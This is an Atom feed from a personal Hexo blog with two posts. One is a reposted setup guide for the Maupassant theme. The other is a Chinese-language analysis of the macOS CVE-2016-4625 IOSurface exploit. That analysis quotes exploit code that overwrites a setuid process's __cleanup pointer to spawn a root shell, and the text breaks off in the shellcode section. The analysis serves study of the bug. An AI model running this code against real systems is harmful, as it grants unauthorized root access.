<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FloatingGuy&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-03-09T16:02:50.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>FloatingGuy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>简洁主题--Maupassant</title>
    <link href="http://yoursite.com/2017/03/09/%E7%AE%80%E6%B4%81%E4%B8%BB%E9%A2%98-Maupassant/"/>
    <id>http://yoursite.com/2017/03/09/简洁主题-Maupassant/</id>
    <published>2017-03-09T15:26:42.000Z</published>
    <updated>2017-03-09T16:02:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>转载自：<a href="https://www.haomwei.com/technology/maupassant-hexo.html#文章摘要" target="_blank" rel="external">https://www.haomwei.com/technology/maupassant-hexo.html#文章摘要</a></p>
<a id="more"></a>
<p>Maupassant最初是由Cho大神为Typecho平台设计开发的一套响应式模板，体积只有20KB，在各种尺寸的设备上表现出色。由于其简洁大气的风格受到许多用户喜爱，目前也已经被移植到了多个平台上，例如：</p>
<ul>
<li>Typecho：<a href="https://github.com/pagecho/maupassant/" target="_blank" rel="external">https://github.com/pagecho/maupassant/</a></li>
<li>Octopress：<a href="https://github.com/pagecho/mewpassant/" target="_blank" rel="external">https://github.com/pagecho/mewpassant/</a></li>
<li>Farbox：<a href="https://github.com/pagecho/Maupassant-farbox/" target="_blank" rel="external">https://github.com/pagecho/Maupassant-farbox/</a></li>
<li>Wordpress：<a href="https://github.com/iMuFeng/maupassant/" target="_blank" rel="external">https://github.com/iMuFeng/maupassant/</a></li>
<li>Ghost: <a href="https://github.com/LjxPrime/maupassant/" target="_blank" rel="external">https://github.com/LjxPrime/maupassant/</a><br>我在一年多以前使用Typecho博客程序的时候就用过这套主题（历史文章），后来更换至Hexo后不得不暂时放弃它，直到几个月前发现了由icylogic移植到Hexo的版本，喜出望外，立刻回归到Maupassant。</li>
</ul>
<p>不过由icylogic最初移植的版本只保留了主题最基本的模块，跟Cho自己发布的Farbox版类似，无法满足大部分爱折腾的Hexoer的需要。因此，在这半年的使用过程中，我将icylogic的源码fork过来，陆陆续续添加了一些想要的功能，目前能够实现的功能已经跟当初Typecho平台上的版本差不多了。</p>
<p>我已经将修改后的代码发布在Github上，有兴趣的朋友可以下载试用，并欢迎反馈问题：</p>
<h3 id="主题安装"><a href="#主题安装" class="headerlink" title="主题安装"></a>主题安装</h3><p>安装主题和渲染器：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/tufu</span>9441/maupassant-hexo.git themes/maupassant</div><div class="line"><span class="variable">$ </span>npm install hexo-renderer-jade --save</div><div class="line"><span class="variable">$ </span>npm install hexo-renderer-sass --save</div></pre></td></tr></table></figure></p>
<p>编辑Hexo目录下的 _config.yml，将theme的值改为maupassant。</p>
<p>注：若npm install hexo-renderer-sass安装时报错，可能是国内网络问题，请尝试使用代理或者切换至<a href="http://npm.taobao.org/" target="_blank" rel="external">淘宝NPM镜像</a>安装，感谢光头强提供的方法。</p>
<h3 id="功能配置"><a href="#功能配置" class="headerlink" title="功能配置"></a>功能配置</h3><figure class="highlight c"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">fancybox: <span class="literal">true</span> ## If you want to use fancybox please <span class="built_in">set</span> the value to <span class="literal">true</span>.</div><div class="line">duoshuo: ## Your duoshuo_shortname, e.g. username</div><div class="line">disqus: ## Your disqus_shortname, e.g. username</div><div class="line">google_search: <span class="literal">true</span> ## Use Google search, <span class="literal">true</span>/<span class="literal">false</span>.</div><div class="line">baidu_search: ## Use Baidu search, <span class="literal">true</span>/<span class="literal">false</span>.</div><div class="line">swiftype: ## Your swiftype_key, e.g. m7b11ZrsT8Me7gzApciT</div><div class="line">tinysou: ## Your tinysou_key, e.g. <span class="number">4</span>ac092ad8d749fdc6293</div><div class="line">self_search: ## Use a jQuery-based local search engine, <span class="literal">true</span>/<span class="literal">false</span>.</div><div class="line">google_analytics: ## Your Google Analytics tracking id, e.g. UA<span class="number">-42425684</span><span class="number">-2</span></div><div class="line">baidu_analytics: ## Your Baidu Analytics tracking id, e.g. <span class="number">8006843039519956000</span></div><div class="line">show_category_count: <span class="literal">false</span> ## If you want to show the count of categories in the sidebar widget please <span class="built_in">set</span> the value to <span class="literal">true</span>.</div><div class="line">shareto: <span class="literal">true</span> ## If you want to use the share button please <span class="built_in">set</span> the value to <span class="literal">true</span>.</div><div class="line">busuanzi: <span class="literal">true</span> ## If you want to use Busuanzi page views please <span class="built_in">set</span> the value to <span class="literal">true</span>.</div><div class="line">widgets_on_small_screens: <span class="literal">false</span> ## Set to <span class="literal">true</span> to enable widgets on small screens.</div><div class="line">menu:</div><div class="line">  - page: home</div><div class="line">    directory: .</div><div class="line">    icon: fa-home</div><div class="line">  - page: archive</div><div class="line">    directory: archives/</div><div class="line">    icon: fa-archive</div><div class="line">  - page: about</div><div class="line">    directory: about/</div><div class="line">    icon: fa-user</div><div class="line">  - page: rss</div><div class="line">    directory: atom.xml</div><div class="line">    icon: fa-rss</div><div class="line">widgets: ## Six widgets in sidebar provided: search, category, tag, recent_posts, rencent_comments and links.</div><div class="line">  - search</div><div class="line">  - category</div><div class="line">  - tag</div><div class="line">  - recent_posts</div><div class="line">  - recent_comments</div><div class="line">  - links</div><div class="line">links:</div><div class="line">  - title: site-name1</div><div class="line">    url: http:<span class="comment">//www.example1.com/</span></div><div class="line">  - title: site-name2</div><div class="line">    url: http:<span class="comment">//www.example2.com/</span></div><div class="line">  - title: site-name3</div><div class="line">    url: http:<span class="comment">//www.example3.com/</span></div><div class="line"></div><div class="line">timeline:</div><div class="line">  - num: <span class="number">1</span></div><div class="line">    word: <span class="number">2014</span>/<span class="number">06</span>/<span class="number">12</span>-Start</div><div class="line">  - num: <span class="number">2</span></div><div class="line">    word: <span class="number">2014</span>/<span class="number">11</span>/<span class="number">29</span>-XXX</div><div class="line">  - num: <span class="number">3</span></div><div class="line">    word: <span class="number">2015</span>/<span class="number">02</span>/<span class="number">18</span>-DDD</div><div class="line">  - num: <span class="number">4</span></div><div class="line">    word: More</div><div class="line"></div><div class="line"># Static files</div><div class="line">js: js</div><div class="line">css: css</div><div class="line"># Theme version</div><div class="line">version: <span class="number">0.0</span><span class="number">.0</span></div></pre></td></tr></table></figure>
<ul>
<li>fancybox - 是否启用Fancybox图片灯箱效果</li>
<li>duoshuo - 多说评论 shortname</li>
<li>disqus - Disqus评论 shortname</li>
<li>google_search - 默认使用Google搜索引擎</li>
<li>baidu_search - 若想使用百度搜索，将其设定为true。</li>
<li>swiftype - Swiftype 站内搜索key</li>
<li>tinysou - 微搜索 key</li>
<li>self_search - 基于jQuery的本地搜索引擎，需要安装hexo-generator-search插件使用。</li>
<li>google_analytics - Google Analytics 跟踪ID</li>
<li>baidu_analytics - 百度统计 跟踪ID</li>
<li>show_category_count - 是否显示侧边栏分类数目</li>
<li>shareto - 是否使用分享按鈕</li>
<li>busuanzi - 是否使用不蒜子页面访问计数</li>
<li>widgets_on_small_screens - 是否在移动设备屏幕底部显示侧边栏</li>
<li>menu - 自定义页面及菜单，依照已有格式填写。填写后请在source目录下建立相应名称的文件夹，并包含index.md文件，以正确显示页面。导航菜单中集成了FontAwesome图标字体，可以在这里选择新的图标，并按照* 相关说明使用。</li>
<li>widgets - 选择和排列希望使用的侧边栏小工具。</li>
<li>links - 友情链接，请依照格式填写。</li>
<li>timeline - 网站历史时间线，在页面front-matter中设置layout: timeline可显示。</li>
<li>Static files - 静态文件存储路径，方便设置CDN缓存。</li>
<li>Theme version - 主题版本，便于静态文件更新后刷新CDN缓存。</li>
</ul>
<h3 id="主题特性"><a href="#主题特性" class="headerlink" title="主题特性"></a>主题特性</h3><hr>
<h4 id="网站图标"><a href="#网站图标" class="headerlink" title="网站图标"></a>网站图标</h4><p>若要设置网站Favicon，可以将favicon.ico放在Hexo根目录的source文件夹下，建议的大小：32px*32px。</p>
<p>若要为网站添加苹果设备图标，请将命名为apple-touch-icon.png的图片放在同样的位置，建议的大小：114px*114px。</p>
<h4 id="文章摘要"><a href="#文章摘要" class="headerlink" title="文章摘要"></a>文章摘要</h4><p>首页默认显示文章摘要而非全文，可以在文章的front-matter中填写一项description:来设置你想显示的摘要，或者直接在文章内容中插入<!--more-->以隐藏后面的内容。<br>若两者都未设置，则自动截取文章第一段作为摘要。</p>
<h4 id="添加页面"><a href="#添加页面" class="headerlink" title="添加页面"></a>添加页面</h4><p>在source目录下建立相应名称的文件夹，然后在文件夹中建立index.md文件，并在index.md的front-matter中设置layout为<code>layout: page</code>。若需要单栏页面，就将layout设置为 layout: single-column。</p>
<h4 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h4><p>在文章的front-matter中添加toc: true即可让该篇文章显示目录。</p>
<h4 id="文章评论"><a href="#文章评论" class="headerlink" title="文章评论"></a>文章评论</h4><p>文章和页面的评论功能可以通过在front-matter中设置comments: true或comments: false来进行开启或关闭（默认开启）。</p>
<p>注意：如果没有出现 多说评论框，很有可能是登录多说帐号失败。请打开浏览器调试窗口查看请求是否成功。</p>
<h4 id="语法高亮"><a href="#语法高亮" class="headerlink" title="语法高亮"></a>语法高亮</h4><p>要启用代码高亮，请在Hexo目录的_config.yml中将highlight选项按照如下设置：<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="attr">highlight:</span></div><div class="line"><span class="attr">  enable:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  auto_detect:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  line_number:</span> <span class="literal">true</span></div><div class="line"><span class="attr">  tab_replace:</span></div></pre></td></tr></table></figure></p>
<h4 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h4><p>要启用数学公式支持，请在Hexo目录的_config.yml中添加：</p>
<p><code>mathjax: true</code><br>并在相应文章的front-matter中添加<code>mathjax: true</code>，例如：<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="attr">title:</span> Test Math</div><div class="line"><span class="attr">date:</span> <span class="number">2016</span><span class="bullet">-04</span><span class="bullet">-05</span> <span class="number">14</span>:<span class="number">16</span>:<span class="number">00</span></div><div class="line"><span class="attr">categories:</span> math</div><div class="line"><span class="attr">mathjax:</span> <span class="literal">true</span></div><div class="line"><span class="meta">---</span></div></pre></td></tr></table></figure></p>
<h4 id="支持语言"><a href="#支持语言" class="headerlink" title="支持语言"></a>支持语言</h4><p>目前支持简体中文（zh-CN），繁体中文（zh-TW），英语（en），法语（fr-FR），德语（de-DE），韩语（ko）和西班牙语（es-ES），欢迎翻译至其它语言。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转载自：&lt;a href=&quot;https://www.haomwei.com/technology/maupassant-hexo.html#文章摘要&quot;&gt;https://www.haomwei.com/technology/maupassant-hexo.html#文章摘要&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="捣鼓" scheme="http://yoursite.com/categories/categories-fiddle/"/>
    
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>浅谈 CVE-2016-4625 exploit</title>
    <link href="http://yoursite.com/2017/03/06/%E6%B5%85%E8%B0%88CVE-2016-4625-exploit/"/>
    <id>http://yoursite.com/2017/03/06/浅谈CVE-2016-4625-exploit/</id>
    <published>2017-03-06T06:54:26.000Z</published>
    <updated>2017-03-09T16:29:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>(本人第一次接触 OSX 系统，这篇文章对我来说难度还是比较大的，本人水平有限文章难免有错，请路过的大牛多多指点，轻拍)</p>
<p>本文是为分析 yalu102越狱工具做铺垫，这个漏洞并没有在 yalu越狱中被使用，因为这个漏洞是 macOS 中的。<br>分析本文是为了学习 XNU 中 task 结构体存在的分险并且结合 port 来实现提权的原理。</p>
<a id="more"></a>
<p>预备知识：</p>
<ul>
<li>IOKit 开发基础知识</li>
<li>Mach Port 通信基础知识</li>
</ul>
<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>IOSurface是基于 IOKit的一个扩展模块，IOUserClient 的扩展类IOSurfaceRootUserClient 的成员fTask（0xf）引用了用户空间的 task struct 指针，但是没有修改task的引用计数器，由此产生了一个 UAF 漏洞。如果task 对应的进程被杀死，task struct 对象会被回收，IOSurfaceRootUserClient 成员fTask 就变成了一个 悬挂指针。</p>
<p>Apple 在其开发者网站上提供了一份 IOKit 扩展设计样式的示例 AppleSamplePCI。因为示例中存在dangling 指针漏洞，所以 Ian Beer 就去 IOSurface 模块中查找对应的代码，利用 IOSurface 模块中的 dangling 漏洞来执行任意代码。因为这个开发模板中存在漏洞所以会影响 Apple 开发的所有IOKit 子模块。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//AppleSamplePCI.kext implementation of initWithTask</span></div><div class="line"><span class="keyword">bool</span> SamplePCIUserClientClassName::initWithTask(</div><div class="line">  <span class="keyword">task_t</span> owningTask,</div><div class="line">  <span class="keyword">void</span>* securityID,</div><div class="line">  UInt32 type,</div><div class="line">  OSDictionary* properties)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">bool</span> success = super::initWithTask(owningTask,</div><div class="line">                                     securityID,</div><div class="line">                                     type,</div><div class="line">                                     properties);</div><div class="line">  fTask = owningTask;       <span class="comment">//bug 悬挂指针</span></div><div class="line">  fDriver = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> success;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="漏洞利用思想："><a href="#漏洞利用思想：" class="headerlink" title="漏洞利用思想："></a>漏洞利用思想：</h3><p><img src="/include/img/4625/exploit-all.jpg" alt="exploit-all"></p>
<p>此漏洞的提权思想很简单，因为不受沙盒的限制所以还可以用来做沙盒绕过。<br><strong>exploit的核心就是将 shellcode注入到所有者是root 用户并且拥有 s执行权限的子进程中，这个进程开启的 shell 是root用户的， shellcode可以直接作为子进程的参数传递到栈上。</strong></p>
<p>shellcode 本身很简单，重点在第3-4步将子进程的执行权限窃取到 shellcode 上，并且要精准计算栈的偏移量。<br>其他还有一下技巧性的东西，比如第2步如何控制子进程让其在退出前阻塞、如何将子进程的 task port 发送到父进程中。<br>（下文可能会出现上面流程图中的编号，请根据上下文识别）</p>
<h3 id="分析-exploit"><a href="#分析-exploit" class="headerlink" title="分析 exploit"></a>分析 exploit</h3><p>这里会分成2部分：</p>
<ol>
<li>准备阶段，负责提供一个触发漏洞的环境和执行负载的环境。</li>
<li>攻击阶段，分析如何使用漏洞来达到劫持控制流、任意地址写以及 shellcode 的功能。</li>
</ol>
<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>将parent 的port 传递给child， 然后让child 将其task port 传递给 parent的步骤：</p>
<ol>
<li>父进程通过task_get_special_port获取他的special ports，并存储在局部变量中。special ports是一些连接着系统服务的port，在fork的过程中，子进程会继承special port。</li>
<li>父进程通过mach_port_allocate函数创建一个新的port，通过task_set_special_port将这个新的port设为special port，且通过mach_port_insert_right为这个新的port赋予写的权限。并最终试图将这个新的port传递给子进程。</li>
<li>父进程进行fork，子进程继承了<a href="https://googleprojectzero.blogspot.kr/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">2</a>中创建的新的port，作为自己的special port。</li>
<li>父进程将保存的在临时变量中的special port，重新设置回来。</li>
<li>子进程获取这个替换过的special port，并且保存下来。</li>
<li>子进程通过继承的special port和父进程通信。</li>
<li>父进程在收到子进程的消息后，将当前的special port再发送给子进程。</li>
<li>子进程也将收到的special port设置为自己的special port。</li>
<li>子进程将自己的 task port 发送给父进程</li>
</ol>
<p>对应的流程图：<br><img src="/include/img/4625/port_dance.jpg" alt="port-dance"></p>
<p>port dancer主要的目的是将子进程的 task port传递给父进程，父进程可以使用子进程的 task port创建 IOSurface 的 userclient 对象。</p>
<h4 id="攻击阶段"><a href="#攻击阶段" class="headerlink" title="攻击阶段"></a>攻击阶段</h4><p>上一节我们已经获取 子进程的 task port, 那么现在就可以 将子进程的 task port 传递给 IOSurface 制造一个悬挂指针，接下来可以重新开启一个子进程 运行tracerout6来偷梁换柱了，然后想办法获取写子进程内存的权限，通过覆盖子进程的函数指针__cleanup获取控制流执行 shellcode。</p>
<p>按照执行顺序将攻击流程分成2部分:</p>
<pre><code>1. 覆盖子进程__cleanup函数指针
2. 执行 shellcode。
</code></pre><ol>
<li><p>覆盖子进程__cleanup 函数指针<br> 要 overwrite 首先要任意地址写。IOSurface 框架可以做到这一点，看雪翻译的一篇<a href="http://bbs.pediy.com/thread-215839.htm" target="_blank" rel="external">文章</a>中介绍，IOSurface框架提供了适用于跨进程共享的框架缓冲对象,IOSurfaces仅仅用来包裹共享内存缓冲区。</p>
<ul>
<li><p>IOSurfaceRootUserClient::create_surface() 接受一个键值对作为参数来创建共享内存对象，其他进程可以把这个对象映射到它们自己的地址空间中。<br>参数：<br>  IOSurfaceAddress -&gt; target_addr<br>  IOSurfaceAllocSize -&gt; 0x1000<br>  IOSurfacesGlobal-&gt;True    允许其他 ioSurface 访问 当前 iosurface 对象。</p>
</li>
<li><p>IOSurfaceRootUserClient::lookup_surface()将目标进程的内存共享对象，映射到当前进程。</p>
</li>
</ul>
</li>
</ol>
<p><em>使用上面的代码， 可以将目标进程 的 iosurface 创建的共享内存 地址 target-addr 开始的0x1000 大小的内存</em></p>
<p>我们要 root 就需要在 获取共享内存对象之前，将 fTask 指向的 task 对象换成一个 更高权限的 进程的 task 结构体。这样我们就可以获取到 包裹高权限的 进程的共享内存对象了。</p>
<p>下面分析 准备阶段的代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">io_connect_t</span> dangler = get_uc(child_task_port);        [<span class="number">0</span>] 使用 child task 创建一个 iosurface 对象，返回 iosurface 对象的 <span class="function">port</span></div><div class="line"></div><div class="line">  <span class="title">printf</span><span class="params">(<span class="string">"got dangler\n"</span>)</span>;</div><div class="line"></div><div class="line">  mach_port_deallocate(mach_task_self(), child_task_port); [<span class="number">1</span>] 杀死子进程</div><div class="line">  kill(child_pid, <span class="number">9</span>);</div><div class="line"> ...</div><div class="line"></div><div class="line">  <span class="keyword">int</span> target_pid = <span class="number">0</span>;</div><div class="line">  <span class="keyword">int</span> blocker = fork_and_exec_blocking(<span class="string">"/usr/sbin/traceroute6"</span>, argv, <span class="literal">NULL</span>, &amp;target_pid);        [<span class="number">2</span>] 创建一个高权限的进程，替换 fTask 对象</div><div class="line"></div><div class="line"><span class="comment">// 构造create_surface 的参数 dictionary</span></div><div class="line">  CFMutableDictionaryRef surface_props = CFDictionaryCreateMutable(kCFAllocatorDefault,</div><div class="line">                                                                   <span class="number">0</span>,</div><div class="line">                                                                   &amp;kCFTypeDictionaryKeyCallBacks,</div><div class="line">                                                                   &amp;kCFTypeDictionaryValueCallBacks);</div><div class="line"></div><div class="line">  <span class="keyword">uint64_t</span> target_addr = fptr_page;</div><div class="line">  <span class="keyword">uint32_t</span> target_size = <span class="number">0x1000</span>;</div><div class="line"></div><div class="line"><span class="comment">// 向 dictionary 中添加 目标进程的共享内存其实地址 + 共享内存大小</span></div><div class="line">  CFDictionarySetValue(surface_props, CFSTR(<span class="string">"IOSurfaceAddress"</span>), CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &amp;target_addr));</div><div class="line">  CFDictionarySetValue(surface_props, CFSTR(<span class="string">"IOSurfaceAllocSize"</span>), CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &amp;target_size));</div><div class="line">  CFDictionarySetValue(surface_props, CFSTR(<span class="string">"IOSurfaceIsGlobal"</span>), kCFBooleanTrue);</div><div class="line"></div><div class="line">  CFDataRef props_data = IOCFSerialize(surface_props, kNilOptions);</div><div class="line">  <span class="keyword">void</span>* inputStruct = (<span class="keyword">void</span>*)CFDataGetBytePtr(props_data);</div><div class="line">  <span class="keyword">size_t</span> inputStructCnt = (<span class="keyword">size_t</span>)CFDataGetLength(props_data);</div><div class="line"></div><div class="line">  <span class="keyword">uint64_t</span> inputScalar[<span class="number">16</span>];</div><div class="line">  <span class="keyword">size_t</span> inputScalarCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">  <span class="keyword">uint64_t</span> outputScalar[<span class="number">16</span>];</div><div class="line">  <span class="keyword">uint32_t</span> outputScalarCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">  <span class="keyword">char</span> outputStruct[<span class="number">0x548</span>];</div><div class="line">  <span class="keyword">size_t</span> outputStructCnt = <span class="number">0x548</span>;</div><div class="line"></div><div class="line">  <span class="comment">// create_surface</span></div><div class="line">  <span class="keyword">int</span> selector = <span class="number">0</span>;</div><div class="line"></div><div class="line">  err = IOConnectCallMethod(                    [<span class="number">3</span>] 调用 create_surface 函数，在目标进程中创建 共享内存对象</div><div class="line">          dangler,</div><div class="line">          selector,</div><div class="line">          inputScalar,</div><div class="line">          inputScalarCnt,</div><div class="line">          inputStruct,</div><div class="line">          inputStructCnt,</div><div class="line">          outputScalar,</div><div class="line">          &amp;outputScalarCnt,</div><div class="line">          outputStruct,</div><div class="line">          &amp;outputStructCnt);</div><div class="line"></div><div class="line">说明： 在这提一下iokit 扩展通信都是通过 selector 来代替函数名。</div><div class="line"></div><div class="line"><span class="keyword">int</span> target_surface_id = *(<span class="keyword">int</span>*)(&amp;outputStruct[<span class="number">0x10</span>]);</div><div class="line"></div><div class="line">  <span class="keyword">io_connect_t</span> surface = get_uc(mach_task_self());            [<span class="number">4</span>] 使用 parent task 创建一个 iosurface 对象，返回 iosurface 对象的 port</div><div class="line"></div><div class="line">  inputStruct = <span class="literal">NULL</span>;</div><div class="line">  inputStructCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">  inputScalar[<span class="number">0</span>] = target_surface_id;</div><div class="line">  inputScalarCnt = <span class="number">1</span>;</div><div class="line"></div><div class="line">  outputStructCnt = <span class="number">0x548</span>;</div><div class="line"></div><div class="line">  <span class="comment">// lookup_surface</span></div><div class="line">  selector = <span class="number">6</span>;</div><div class="line"></div><div class="line">  err = IOConnectCallMethod(                                    [<span class="number">5</span>] 调用lookup_surface函数， 将目标进程的共享内存映射到 parent 进程</div><div class="line">          surface,</div><div class="line">          selector,</div><div class="line">          inputScalar,</div><div class="line">          inputScalarCnt,</div><div class="line">          inputStruct,</div><div class="line">          inputStructCnt,</div><div class="line">          outputScalar,</div><div class="line">          &amp;outputScalarCnt,</div><div class="line">          outputStruct,</div><div class="line">          &amp;outputStructCnt);</div><div class="line"></div><div class="line">  <span class="keyword">char</span>* shared_page = *(<span class="keyword">char</span>**)(&amp;outputStruct[<span class="number">0</span>]);</div><div class="line">  shared_page[<span class="number">0</span>] = ‘B’;</div><div class="line">  *(<span class="keyword">uint64_t</span>*)(shared_page+fptr_offset) = stack_shift_gadget;                [<span class="number">6</span>] 第一段 gadget 地址覆盖 目标进程的__cleanup 函数指针</div><div class="line"></div><div class="line"><span class="comment">// 下一节 介绍</span></div><div class="line">  unblock_pipe_and_interact(blocker);</div><div class="line"></div><div class="line">  <span class="keyword">int</span> sl;</div><div class="line">  wait(&amp;sl);</div></pre></td></tr></table></figure></p>
<p>上述 1-6 步就是parent获取child共享内存的原语， 并且覆盖了目标进程的 __cleanup 全局变量。<br>步骤 2 中还使用了一个技巧<a href="阻塞进程">3</a>使得child进程能在 exit 之前阻塞，等待parent映射内存设置 shellcode。</p>
<p>总结一下</p>
<ol>
<li><p>让child task 阻塞的原语<br>给 traceroute6 一个无效参数traceroute6会使用 strerr 标准错误输出错误信息，但是 parent 使用管道pip_write 替换了标准错误输出，并且管道已经阻塞了所以traceroute6卡在程序中无法调用exit 函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"traceroute6: invalid wait time.\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</div></pre></td></tr></table></figure>
</li>
<li><p>parent将child task的1页内存映射到自己的内存空间的原语<br>上面 提到了细节<br>这里 映射的是  libsystem_c.dylib:<strong>DATA ，其中包含了 </strong>cleanup 函数指针的地址。（这个地址要用 add_gadget 的地址去覆盖， exit 的时候会调用这个函数）</p>
</li>
</ol>
<h4 id="shellcode-分析"><a href="#shellcode-分析" class="headerlink" title="shellcode 分析"></a>shellcode 分析</h4><p>创建 shellcode 的代码在 setup_payload_and_offsets 函数中，要覆盖 DATA段的__cleanup 函数指针首先要获取其位置然后查找几段 gadget，执行的数序是：</p>
<ul>
<li>修改 rsp,跳转到 traceroute6 进程栈的参数区</li>
<li>大量的 ret slide 指令，提高shellcode 的兼容性</li>
<li>执行 setuid(0)的 shellcode</li>
<li>执行 system(“/bin/csh”)的 shellcode</li>
</ul>
<p>下面继续分析代码。</p>
<p>参数说明:</p>
<pre><code>stack_shift : 第一段 gadget 的地址
fptr_page : 目标进程建立共享内存的起始地址
fptr_offset : __cleanup 相对 fptr_page 的偏移
</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div 